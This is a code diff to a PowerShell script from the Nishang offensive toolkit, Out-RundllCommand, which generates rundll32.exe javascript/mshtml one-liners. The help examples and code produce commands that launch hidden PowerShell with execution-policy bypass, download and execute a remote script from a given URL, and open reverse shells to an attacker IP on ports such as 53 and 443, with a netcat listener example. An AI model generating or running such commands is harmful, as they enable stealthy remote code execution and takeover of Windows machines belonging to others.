@@ -20,9 +20,9 @@ The port on which the connection is establised.
 .EXAMPLE
 PS > Out-RundllCommand -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"
 
-Use above when you want to use the default payload, which is a powershell download and execute one-liner.
+Use above when you want to use the payload which is a powershell download and execute one-liner.
 
-
+.EXAMPLE
 # netcat -lvp 443
 
 Start a netcat/Powercat listener.
@@ -30,6 +30,11 @@ Start a netcat/Powercat listener.
 PS > Out-RundllCommand -Reverse -IPAddress 192.168.230.1 -Port 443
 
 Use above command to get a reverse PowerShell session on the target.
+
+.EXAMPLE
+PS > Out-RundllCommand -Payload "calc.exe"
+
+Use above for executing a custom payload.
 
 
 .LINK
@@ -86,9 +91,9 @@ https://github.com/samratashok/nishang
         #Check if the payload url has been provided by the user
         if($PayloadURL)
         {
-            $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
+            $Payload = "powershell -w h -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
         }
-        $cmd = "rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();r=new%20ActiveXObject(""WScript.Shell"").run(""powershell -w h -nologo -noprofile -ep bypass $Payload"",0,true);"
+        $cmd = "rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();r=new%20ActiveXObject(""WScript.Shell"").run(""$Payload"",0,true);"
     }  
     Write-Output $cmd
     Write-Warning "Copy the command from the $OutputPath file to avoid errors."
